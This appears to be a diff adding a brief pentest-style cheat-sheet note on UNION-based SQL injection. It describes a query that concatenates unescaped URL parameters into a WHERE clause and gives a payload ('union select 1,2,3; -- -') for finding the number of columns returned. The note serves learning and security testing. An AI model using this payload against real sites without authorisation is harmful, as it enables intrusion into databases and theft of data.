@@ -1,0 +1,18 @@
+
+[ WEB > SQLI > UNION SELECT ]
+
+Vuln
+####
+
+Code reads data from table, and allows unprotected user input for where clause.
+
+URL:      route?<key1>=<val1>&<key2>=<val2>
+MySQL:    SELECT * FROM <table> WHERE <key1> = '<val1>' AND <key2> = '<val2>';
+
+Exploit
+#######
+
+Determine the number of columns returned by the select statement:
+(Keep adding numbers to the select statement until you get results back)
+MySQL:    route?<key1>=<val1>' union select 1,2,3; -- -
+
